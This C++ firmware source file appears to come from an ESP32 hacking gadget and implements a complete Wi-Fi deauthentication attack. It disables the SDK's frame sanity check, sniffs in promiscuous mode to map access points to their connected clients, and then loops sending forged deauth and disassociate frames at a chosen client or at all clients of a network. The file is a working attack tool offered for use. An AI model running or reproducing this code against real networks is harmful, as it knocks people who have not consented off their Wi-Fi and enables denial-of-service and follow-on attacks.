#include "wifi/DeauthApp.h"
#include "DisplayManager.h"

#define TAG "Deauth"

extern WIFIApp wifiApp;

int packetSent = 0;
bool targetSTA = false;
static int deauthScanNetworkCount = 0;
static uint32_t shownDeauthTargetIndex = 0;
static int shownStationIndex = 0;
TaskHandle_t deauthTaskHandle = NULL;
TaskHandle_t deauthLEDTaskHandle = NULL;
DeauthState deauthState = WIFI_DEAUTH_STATE_HOME;

/**
 * @brief Decomplied function that overrides original one at compilation time.
 * Needs target_link_libraries(${COMPONENT_LIB} -Wl,-zmuldefs) in CMakeLists.txt
 * 
 * @attention This function is not meant to be called!
 * @see Project with original idea/implementation https://github.com/GANESH-ICMC/esp32-deauther
 */
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3){
  return 0;
}

uint8_t deauthPacket[26] = {
  /*  0 - 1  */ 0xC0, 0x00,                         // type, subtype c0: deauth (a0: disassociate)
  /*  2 - 3  */ 0x00, 0x00,                         // duration (SDK takes care of that)
  /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // reciever (target)
  /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // source (ap)
  /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID (ap)
  /* 22 - 23 */ 0x00, 0x00,                         // fragment & squence number
  /* 24 - 25 */ 0x01, 0x00                          // reason code (1 = unspecified reason)
};

uint8_t broadcast[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
bool macBroadcast(uint8_t* mac) {
  for (uint8_t i = 0; i < 6; i++)
    if (mac[i] != broadcast[i]) return false;

  return true;
}

bool macMulticast(uint8_t* mac) {
  // see https://en.wikipedia.org/wiki/Multicast_address
  if ((mac[0] == 0x33) && (mac[1] == 0x33)) return true;

  if ((mac[0] == 0x01) && (mac[1] == 0x80) && (mac[2] == 0xC2)) return true;

  if ((mac[0] == 0x01) && (mac[1] == 0x00) && ((mac[2] == 0x5E) || (mac[2] == 0x0C))) return true;

  if ((mac[0] == 0x01) && (mac[1] == 0x0C) && (mac[2] == 0xCD) &&
    ((mac[3] == 0x01) || (mac[3] == 0x02) || (mac[3] == 0x04)) &&
    ((mac[4] == 0x00) || (mac[4] == 0x01))) return true;

  if ((mac[0] == 0x01) && (mac[1] == 0x00) && (mac[2] == 0x0C) && (mac[3] == 0xCC) && (mac[4] == 0xCC) &&
    ((mac[5] == 0xCC) || (mac[5] == 0xCD))) return true;

  if ((mac[0] == 0x01) && (mac[1] == 0x1B) && (mac[2] == 0x19) && (mac[3] == 0x00) && (mac[4] == 0x00) &&
    (mac[5] == 0x00)) return true;

  return false;
};

const char* format_mac(const uint8_t mac[6]) {
  // Example MAC string: "01:23:45:67:89:AB\0"
  char* mac_str = (char *)malloc(18);
  if (mac_str == NULL) {
    return NULL;
  }

  sprintf(mac_str, "%02X:%02X:%02X:%02X:%02X:%02X",
          mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);

  return mac_str;
}

int findAccesspoint(uint8_t* mac) {
  for (int i = 0; i < deauthScanNetworkCount; i++) {
    if (memcmp(WiFi.BSSID(i), mac, 6) == 0) return i;
  }
  return -1;
}

struct station_t {
  uint8_t mac[6];
  int32_t rssi;
  const char *macstr;
};

struct ap_t {
  uint8_t mac[6];
  const char *macstr;
  int32_t channel;
  int32_t rssi;
  const char *ssid;
  station_t *stations;
  int num_stations;
};

struct deauth_scan_result_t {
  ap_t *aps;
  int num_aps;
} results;

char* remove_colons(const char* input) {
  if (input == NULL) return NULL;

  char* output = (char*)malloc(strlen(input) + 1);
  if (output == NULL) return NULL;

  int j = 0;
  for (int i = 0; input[i] != '\0'; i++) {
    if (input[i] != ':') {
      output[j++] = input[i];
    }
  }
  output[j] = '\0';

  return output;
};

void add_ap(const ap_t *new_ap) {
  ap_t *new_aps = (ap_t *)realloc(results.aps, (results.num_aps + 1) * sizeof(ap_t));
  if (new_aps == NULL) {
    return;
  }
  
  results.aps = new_aps;
  results.aps[results.num_aps] = *new_ap;
  results.aps[results.num_aps].stations = NULL;
  results.aps[results.num_aps].num_stations = 0;

  memset(results.aps[results.num_aps].mac, 0, 6);
  results.num_aps++;
};

void add_sta(ap_t *ap, const station_t *new_sta) {
  station_t *new_stas = (station_t *)realloc(ap->stations, (ap->num_stations + 1) * sizeof(station_t));
  if (new_stas == NULL) {
    ESP_LOGE(TAG, "FAILED TO ADD STATIONS MEM ERR");
    return;
  }
  ap->stations = new_stas;
  ap->stations[ap->num_stations] = *new_sta;
  ap->num_stations++;

  leds->set_color(0, 255, 0, 255);
  leds->set_color(1, 255, 0, 255);
  vTaskDelay(30 / portTICK_PERIOD_MS);
  leds->set_color(0, 0, 0, 0);
  leds->set_color(1, 0, 0, 0);
}

int find_ap(uint8_t* mac) {
  for (int i = 0; i < results.num_aps; i++) {
    if (memcmp(&results.aps[i].mac, mac, 6) == 0) {
      return i;
    }
  }

  return -1;
};

bool ap_has_sta(ap_t *ap, uint8_t* mac) {
  for (int i = 0; i < ap->num_stations; i++) {
    station_t st = ap->stations[i];

    if (memcmp(st.mac, mac, 6) == 0) {
      return true;
    }
  }

  return false;
}

void init_ap_struct(int i) {
  const uint8_t *bssid = WiFi.BSSID(i);
  if (bssid != NULL) {
    memcpy(results.aps[i].mac, bssid, 6);
  } else {
    memset(results.aps[i].mac, 0, 6);
  }

  // Duplicate the SSID
  String ssid = WiFi.SSID(i);
  if (ssid != NULL) {
    results.aps[i].ssid = strdup(ssid.c_str());
  } else {
    results.aps[i].ssid = "";
  }

  // Optionally duplicate the MAC address string for easy logging
  String macStr = WiFi.BSSIDstr(i);
  if (macStr != NULL) {
    results.aps[i].macstr = strdup(macStr.c_str());
  } else {
    results.aps[i].macstr = "";
  }

  // Initialize other fields
  results.aps[i].channel = WiFi.channel(i);
  results.aps[i].rssi = WiFi.RSSI(i);
  results.aps[i].stations = NULL;
  results.aps[i].num_stations = 0;
};

void free_deauth_scan_results() {
  if (results.aps != NULL) {
    // Loop through each ap and free its contents
    for (int i = 0; i < results.num_aps; i++) {
      ap_t *ap = &results.aps[i];

      // Free the dynamically allocated array of stations
      if (ap->stations != NULL) {
        free(ap->stations);
        ap->stations = NULL; // Good practice to set pointer to NULL after freeing
      }

      // Free dynamically allocated strings, if any
      // NOTE: Only free if you know these were dynamically allocated!
      /*
      if (ap->macstr != NULL) {
        free((char*)ap->macstr); // Cast to (char*) if necessary; depends on allocation
        ap->macstr = NULL;
      }
      if (ap->ssid != NULL) {
        free((char*)ap->ssid);
        ap->ssid = NULL;
      }
      */
    }
    free(results.aps); // Free the array of ap_t objects
    results.aps = NULL;
  }
  results.num_aps = 0; // Reset the count
};

// tell websocket clients to ask for new results
void DeauthApp::sendUpdate() {
  JsonDocument doc;
  String res;

  doc["app"] = APP_ID_WIFI_DEAUTH;
  doc["update"] = true;
  serializeJson(doc, res);
  WebServerModule::notifyClients(res);
};

void DeauthApp::sendState(int state) {
  JsonDocument doc;
  String res;

  doc["app"] = APP_ID_WIFI_DEAUTH;
  doc["state"] = state;
  serializeJson(doc, res);
  WebServerModule::notifyClients(res);
};

void DeauthApp::on_rx_packet(void *buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t *packet = (wifi_promiscuous_pkt_t *)buf;

  switch (type) {
    case WIFI_PKT_DATA: {
      uint8_t* macTo = &packet->payload[4];
      uint8_t* macFrom = &packet->payload[10];
      int rssi = packet->rx_ctrl.rssi;

      if (macBroadcast(macTo) || macBroadcast(macFrom) || macMulticast(macTo) ||
        macMulticast(macFrom)) return;

      int apIndex = find_ap(macFrom);

      if (apIndex >= 0) {
        /*
         * the sending macFrom is in our ap list meaning
         * the macTo is a station
         */
        
        //ESP_LOGI(TAG, "DATA:");
        //esp_log_buffer_hex(TAG, packet->payload, packet->rx_ctrl.sig_len);
        
        if (!ap_has_sta(&results.aps[apIndex], macTo)) {
          station_t *st = (station_t*)malloc(sizeof(station_t));
          memcpy(st->mac, macTo, 6);
          st->macstr = format_mac(macTo);
          st->rssi = rssi;
          add_sta(&results.aps[apIndex], st);
          free(st);
          ESP_LOGI(TAG, "NEW: ap -> station \t rssi: %i", rssi);
          DeauthApp::sendUpdate();
          leds->blink(0, 0, 255, 1, 50);
        }
      } else {
        // the sending macFrom is not in our AP List
        apIndex = find_ap(macTo);

        if (apIndex >= 0) {
          /*
           * the receiving macTo is in our AP
           * list meaning the macFrom is a station.
           */
          
          //ESP_LOGI(TAG, "DATA:");
          //esp_log_buffer_hex(TAG, packet->payload, packet->rx_ctrl.sig_len);

          if (!ap_has_sta(&results.aps[apIndex], macFrom)) {
            station_t *st = (station_t*)malloc(sizeof(station_t));
            memcpy(st->mac, macFrom, 6);
            st->macstr = format_mac(macFrom);
            st->rssi = rssi;
            add_sta(&results.aps[apIndex], st);
            free(st);
            ESP_LOGI(TAG, "NEW: station -> ap \t rssi: %i", rssi);
            DeauthApp::sendUpdate();
            leds->blink(0, 0, 255, 1, 50);
          }
        }
      }
      
      break;
    }
    default:
      break;
  }
};

void DeauthApp::scan(void* params) {
  DeauthApp::scan();
  vTaskDelete(NULL);
};

void DeauthApp::scan() {
  leds->set_color(0, 0, 255);
  deauthState = WIFI_DEAUTH_STATE_SCANNING;
  DeauthApp::sendState((int)deauthState);
  deauthScanNetworkCount = WiFi.scanNetworks(false, true);
  shownStationIndex = 0;
  shownDeauthTargetIndex = 0;

  for (int i = 0; i < deauthScanNetworkCount; i++) {
    ap_t *ap = (ap_t*)malloc(sizeof(ap_t));
    add_ap(ap);
    init_ap_struct(i);
    free(ap);
  }

  // enable promiscuous mode to gather stations/ap associations.
  leds->blink(0, 255, 0, 2);
  leds->set_color(0, 255, 0);
  deauthState = WIFI_DEAUTH_STATE_SCANNING_STA;
  DeauthApp::sendState((int)deauthState);
  esp_wifi_set_promiscuous_rx_cb(DeauthApp::on_rx_packet);
  esp_wifi_set_promiscuous(true);
  vTaskDelay(2000 / portTICK_PERIOD_MS); // wait for 2s to show to user its status
  
  JsonDocument doc;
  String res;

  doc["app"] = APP_ID_WIFI_DEAUTH;
  doc["scan_done"] = true;
  serializeJson(doc, res);
  WebServerModule::notifyClients(res);

  deauthState = WIFI_DEAUTH_STATE_SELECT_TARGET;
  DeauthApp::sendState((int)deauthState);
  return;
};

void DeauthApp::stop_attack() {
  deauthState = WIFI_DEAUTH_STATE_HOME;
  DeauthApp::sendState((int)deauthState);

  leds->blink(255, 0, 0, 2);

  if (deauthTaskHandle != NULL) { 
    vTaskDelete(deauthTaskHandle);
    deauthTaskHandle = NULL;
  }

  if (deauthLEDTaskHandle != NULL) {
    vTaskDelete(deauthLEDTaskHandle);
    deauthLEDTaskHandle = NULL;
  }
  
  esp_wifi_set_promiscuous(false);
  free_deauth_scan_results();
  
  packetSent = 0;
  shownDeauthTargetIndex = 0;
  shownStationIndex = 0;
  targetSTA = false;
};

void DeauthApp::start_attack(uint8_t* apMac, uint8_t* stMac, uint8_t reason, uint8_t ch) {
  WIFIDeauthParams* params = new WIFIDeauthParams{ apMac, stMac, reason, ch };
  esp_wifi_set_promiscuous(false); // stop collecting stations
  esp_err_t ret = xTaskCreate(&DeauthApp::_task, "deauth", 16000, params, 1, &deauthTaskHandle);
  if (ret == ESP_FAIL) {
    ESP_LOGE(TAG, "deauth task err: %s", esp_err_to_name(ret));
  }
  xTaskCreate(&DeauthApp::AnimationTask, "deauthleds", 2000, NULL, 3, &deauthLEDTaskHandle);
  LEDStrip::animationRunning = true;
  deauthState = WIFI_DEAUTH_STATE_RUNNING;
  DeauthApp::sendState((int)deauthState);
};

bool DeauthApp::send_packet(uint8_t* packet, uint16_t packetSize, uint8_t ch) {
  esp_err_t ret = esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  if (ret != ESP_OK) {
    ESP_LOGE(TAG, "failed set_channel: %s", esp_err_to_name(ret));
  }

  ret = esp_wifi_80211_tx(WIFI_IF_STA,
                          packet,
                          packetSize,
                          false);
  if (ret != ESP_OK) {
    vTaskDelay(700 / portTICK_PERIOD_MS);
    return false;
  } else {
    packetSent++;
  }

  return true;
};

void DeauthApp::_task(void *taskParams) {
  WIFIDeauthParams* params = static_cast<WIFIDeauthParams*>(taskParams);

  uint16_t packetSize = sizeof(deauthPacket);

  while (1) {
    uint8_t deauthpkt[packetSize];

    memcpy(deauthpkt, deauthPacket, packetSize);
    memcpy(&deauthpkt[4], params->stMac, 6);
    memcpy(&deauthpkt[10], params->apMac, 6);
    memcpy(&deauthpkt[16], params->apMac, 6);
    deauthpkt[24] = params->reason;

    // send deauth frame
    deauthpkt[0] = 0xc0;

    send_packet(deauthpkt, packetSize, params->ch);

    // send disassociate frame
    uint8_t disassocpkt[packetSize];

    memcpy(disassocpkt, deauthpkt, packetSize);

    disassocpkt[0] = 0xa0;

    send_packet(disassocpkt, packetSize, params->ch);

    // send another packet, this time from the station to the accesspoint
    if (!macBroadcast(params->stMac)) { // but only if the packet isn't a broadcast
      // build deauth packet
      memcpy(&disassocpkt[4], params->apMac, 6);
      memcpy(&disassocpkt[10], params->stMac, 6);
      memcpy(&disassocpkt[16], params->stMac, 6);

      // send deauth frame
      disassocpkt[0] = 0xc0;

      send_packet(disassocpkt, packetSize, params->ch);

      // send disassociate frame
      disassocpkt[0] = 0xa0;

      send_packet(disassocpkt, packetSize, params->ch);
    }

    if (deauthLEDTaskHandle == NULL) {
      if (!LEDStrip::animationRunning) {
        xTaskCreate(&DeauthApp::AnimationTask, "deauthleds", 2000, NULL, 3, &deauthLEDTaskHandle);
        vTaskDelay(10 / portTICK_PERIOD_MS);
      }
    }
  }
};

void DeauthApp::AnimationTask(void *params) {
  while (1) {
    int c = rand() % 256;
    leds->set_color(0, 0, 0, c);
    vTaskDelay(500 / portTICK_PERIOD_MS);
    leds->set_color(1, 0, 0, c);
    vTaskDelay(500 / portTICK_PERIOD_MS);
  }
};

void DeauthApp::webEvent(DeauthWebEventParams *ps) {
  ESP_LOGI(TAG, "Web: %s", ps->action);
  JsonDocument doc;
  String res;

  if (strcmp(ps->action, "status") == 0) {
    doc["app"] = APP_ID_WIFI_DEAUTH;
    doc["state"] = (int)deauthState;
    serializeJson(doc, res);
    return WebServerModule::notifyClients(res);
  }

  if (strcmp(ps->action, "scan") == 0) {
    DisplayManager::appRunning = true;
    leds->stop_animations();
    wifiApp = WIFI_APP_DEAUTH;
    DisplayManager::setMenu(WIFI_MENU);
    xTaskCreate(&DeauthApp::scan, "dscan", 4000, NULL, 0, NULL);
  }

  if (strcmp(ps->action, "start") == 0) {
    DisplayManager::appRunning = true;
    leds->stop_animations();
    wifiApp = WIFI_APP_DEAUTH;
    DisplayManager::setMenu(WIFI_MENU);
    
    WebServerModule::stopAP();
    vTaskDelay(2000 / portTICK_PERIOD_MS); // wait for 10s to show to user its status
    //ESP_ERROR_CHECK_WITHOUT_ABORT(esp_wifi_start());

    ap_t& ap = results.aps[ps->ap_id];
    char out[150];
    ESP_LOGI(TAG, "2 - STA ID: %i", ps->sta_id);
    if (ap.num_stations > 0 && ps->sta_id > -1) {
      station_t& st = ap.stations[ps->sta_id];

      sprintf(out, "ap: %s\tsta: %s\treason: %" PRIu8 " ch: %" PRIu32,
              ap.macstr, st.macstr, ps->reason, ap.channel);
      ESP_LOGI(TAG, "%s", out);
      start_attack(ap.mac, st.mac, ps->reason, ap.channel);
    } else {
      // AP mode

      sprintf(out, "ap: %s\tsta: %s\treason: %" PRIu8 " ch: %" PRIu32,
              ap.macstr, "255:255:255:255", ps->reason, ap.channel);
      ESP_LOGI(TAG, "%s", out);
      start_attack(ap.mac, broadcast, ps->reason, ap.channel);
    }
    
  }

  if (strcmp(ps->action, "stop") == 0) {
    DeauthApp::stop_attack();
    DisplayManager::appRunning = false;
    wifiApp = WIFI_APP_NONE;
    DisplayManager::setMenu(MAIN_MENU);
    WebServerModule::startAP();
    vTaskDelay(2000 / portTICK_PERIOD_MS);
  }

  if (strcmp(ps->action, "results") == 0) {
    JsonArray data = doc["results"].to<JsonArray>();
    
    for (int i = 0; i < results.num_aps; i++) {
      ap_t ap = results.aps[i];
      JsonObject obj = data.add<JsonObject>();
      String macAddress = ap.macstr;
      String ssid = ap.ssid;
      int rssi = ap.rssi;

      obj["id"] = i;
      obj["mac"] = macAddress;
      obj["ssid"] = ssid.length() > 0 ? ssid : "";
      obj["rssi"] = rssi;
      obj["channel"] = ap.channel;

      if (ap.num_stations > 0) {
        JsonArray stas = obj["stations"].to<JsonArray>();
        for (int x = 0; x < ap.num_stations; x++) {
          station_t sta = ap.stations[x];
          JsonObject sta_obj = stas.add<JsonObject>();
          sta_obj["id"] = x;
          sta_obj["mac"] = sta.macstr;
          sta_obj["rssi"] = sta.rssi;
        }
      }
    }

    doc["app"] = APP_ID_WIFI_DEAUTH;
    serializeJson(doc, res);
    return WebServerModule::notifyClients(res);
  }
};

void DeauthApp::ontouch(int pad, const char* type, uint32_t value) {
  switch (pad) {
    case LEFT: {
      if (deauthState == WIFI_DEAUTH_STATE_SELECT_TARGET) {
        if (shownDeauthTargetIndex == 0) {
          shownDeauthTargetIndex = (deauthScanNetworkCount - 1);
        } else {
          shownDeauthTargetIndex -= 1;
        }

        return;
      }
      if (deauthState == WIFI_DEAUTH_STATE_SELECT_STA_TARGET) {
        if (shownStationIndex == 0) {
          shownStationIndex = (results.aps[shownDeauthTargetIndex].num_stations - 1);
        } else {
          shownStationIndex -= 1;
        }

        return;
      }
      if (deauthState == WIFI_DEAUTH_STATE_SELECT_AP_OR_STA) {
        if (results.aps[shownDeauthTargetIndex].num_stations > 0) {
          targetSTA = false;
        }
      }
      break;
    }
    case RIGHT: {
      if (deauthState == WIFI_DEAUTH_STATE_SELECT_TARGET) {
        if (shownDeauthTargetIndex == (deauthScanNetworkCount - 1)) {
          shownDeauthTargetIndex = 0;
        } else {
          shownDeauthTargetIndex += 1;
        }

        return;
      }
      if (deauthState == WIFI_DEAUTH_STATE_SELECT_STA_TARGET) {
        if (shownStationIndex == (results.aps[shownDeauthTargetIndex].num_stations - 1)) {
          shownStationIndex = 0;
        } else {
          shownStationIndex += 1;
        }

        return;
      }
      if (deauthState == WIFI_DEAUTH_STATE_SELECT_AP_OR_STA) {
        if (results.aps[shownDeauthTargetIndex].num_stations > 0) {
          targetSTA = true;
        }
      }
      break;
    }
    case MIDDLE: {
      if (strcmp(type, "longPress") == 0) {
        switch (deauthState) {
          case WIFI_DEAUTH_STATE_HOME: {
            wifiApp = WIFI_APP_NONE;
            DisplayManager::appRunning = false;
            return;
          }
          case WIFI_DEAUTH_STATE_START:
          case WIFI_DEAUTH_STATE_PAUSED:
          case WIFI_DEAUTH_STATE_RUNNING:
          case WIFI_DEAUTH_STATE_SCANNING:
          case WIFI_DEAUTH_STATE_SCANNING_STA:
          case WIFI_DEAUTH_STATE_SELECT_TARGET: {
            stop_attack();
            WebServerModule::startAP();
            return;
          }
          case WIFI_DEAUTH_STATE_SELECT_AP_OR_STA: {
            shownStationIndex = 0;
            shownDeauthTargetIndex = 0;
            deauthState = WIFI_DEAUTH_STATE_SELECT_TARGET;
            DeauthApp::sendState((int)deauthState);
            return;
          }
          case WIFI_DEAUTH_STATE_SELECT_STA_TARGET: {
            shownStationIndex = 0;
            deauthState = WIFI_DEAUTH_STATE_SELECT_AP_OR_STA;
            DeauthApp::sendState((int)deauthState);
            return;
          }
          default:
            break;
        }
      }

      switch (deauthState) {
        case WIFI_DEAUTH_STATE_HOME: {
          DeauthApp::scan();
          break;
        }
        case WIFI_DEAUTH_STATE_SELECT_TARGET: {
          deauthState = WIFI_DEAUTH_STATE_SELECT_AP_OR_STA;
          DeauthApp::sendState((int)deauthState);
          return;
        }
        case WIFI_DEAUTH_STATE_SELECT_AP_OR_STA: {
          if (targetSTA) {
            /**
             * if the user has targetSTA chosen
             * and hits middle we goto the select
             * sta screen.
             */
            shownStationIndex = 0;
            deauthState = WIFI_DEAUTH_STATE_SELECT_STA_TARGET;
            DeauthApp::sendState((int)deauthState);
            break;
          } else {
            // else we start attack using broadcast
            WebServerModule::stopAP();
            vTaskDelay(200 / portTICK_PERIOD_MS);
            ap_t& ap = results.aps[shownDeauthTargetIndex];
            start_attack(ap.mac, broadcast, 0x01, ap.channel);
          }
          break;
        }
        case WIFI_DEAUTH_STATE_SELECT_STA_TARGET: {
          WebServerModule::stopAP();
          vTaskDelay(200 / portTICK_PERIOD_MS);
          ap_t& ap = results.aps[shownDeauthTargetIndex];
          station_t& st = ap.stations[shownStationIndex];
          start_attack(ap.mac, st.mac, 0x01, ap.channel);
          return;
        }
        case WIFI_DEAUTH_STATE_RUNNING: {
          vTaskSuspend(deauthTaskHandle);
          if (deauthLEDTaskHandle != NULL) {
            vTaskSuspend(deauthLEDTaskHandle);
          }
          deauthState = WIFI_DEAUTH_STATE_PAUSED;
          DeauthApp::sendState((int)deauthState);
          return;
        }
        case WIFI_DEAUTH_STATE_PAUSED: {
          vTaskResume(deauthTaskHandle);
          if (deauthLEDTaskHandle != NULL) {
            vTaskResume(deauthLEDTaskHandle);
          }
          deauthState = WIFI_DEAUTH_STATE_RUNNING;
          DeauthApp::sendState((int)deauthState);
          return;
        }
        default:
          break;
      }
      
      break;
    }
  }
};

void DeauthApp::render() {
  switch (deauthState) {
    case WIFI_DEAUTH_STATE_HOME: {
      display->centeredText("main/wifi/deauth", 0);
      display->text("", 1);
      display->centeredText("scan", 2);
      display->text("", 3);
      break;
    }
    case WIFI_DEAUTH_STATE_SCAN:
    case WIFI_DEAUTH_STATE_SCANNING: {
      display->centeredText("main/wifi/deauth", 0);
      display->text("", 1);
      display->centeredText("scanning", 2);
      display->centeredText("aps", 3);
      break;
    }
    case WIFI_DEAUTH_STATE_SCANNING_STA: {
      display->centeredText("main/wifi/deauth", 0);
      display->text("", 1);
      display->centeredText("scanning", 2);
      display->centeredText("stations", 3);
      break;
    }
    case WIFI_DEAUTH_STATE_SELECT_TARGET: {
      char line[24];
      snprintf(line, sizeof(line), "%" PRIu32 "/%" PRIu32 "   ST:%i",
              shownDeauthTargetIndex+1,
              (unsigned long int)deauthScanNetworkCount,
              results.aps[shownDeauthTargetIndex].num_stations);
      display->centeredText(line, 0);
      display->text(results.aps[shownDeauthTargetIndex].ssid, 1);
      display->text(results.aps[shownDeauthTargetIndex].macstr, 2);
      snprintf(line, sizeof(line), "CH:%2ld  RSSI:%4ld",
              results.aps[shownDeauthTargetIndex].channel,
              results.aps[shownDeauthTargetIndex].rssi);
      display->centeredText(line, 3);
      break;
    }
    case WIFI_DEAUTH_STATE_SELECT_AP_OR_STA: {
      display->centeredText("select", 0);
      display->text("", 1);
      if (results.aps[shownDeauthTargetIndex].num_stations > 0) {
        if (targetSTA) {
          display->centeredText("STA", 2);
          display->centeredText("station", 3);
        } else {
          display->centeredText("AP", 2);
          display->centeredText("(all stations)", 3);
        }
      } else {
        targetSTA = false;
        display->centeredText("AP", 2);
        display->centeredText("(all stations)", 3);
      }
      
      break;
    }
    case WIFI_DEAUTH_STATE_SELECT_STA_TARGET: {
      char line[24];
      snprintf(line, sizeof(line), "station   %i/%i",
                shownStationIndex +1,
                results.aps[shownDeauthTargetIndex].num_stations);
      display->centeredText(line, 0);
      display->text("", 1);
      display->centeredText(results.aps[shownDeauthTargetIndex].stations[shownStationIndex].macstr, 2);
      display->text("", 3);
      break;
    }
    case WIFI_DEAUTH_STATE_START: {
      display->centeredText("main/wifi/deauth", 0);
      display->text("", 1);
      display->centeredText("starting", 2);
      display->text("", 3);
      break;
    }
    case WIFI_DEAUTH_STATE_PAUSED: {
      char line[20];
      display->centeredText("main/wifi/deauth", 0);
      display->text("", 1);
      display->centeredText("paused", 2);
      snprintf(line, sizeof(line), "pkts: %i", packetSent);
      display->centeredText(line, 3);
      break;
    }
    case WIFI_DEAUTH_STATE_RUNNING: {
      char line[20];
      display->centeredText("main/wifi/deauth", 0);
      display->text("", 1);
      display->centeredText("running", 2);
      snprintf(line, sizeof(line), "pkts: %i", packetSent);
      display->centeredText(line, 3);
      break;
    }
    default:
      break;
  }

  vTaskDelay(20 / portTICK_PERIOD_MS);
};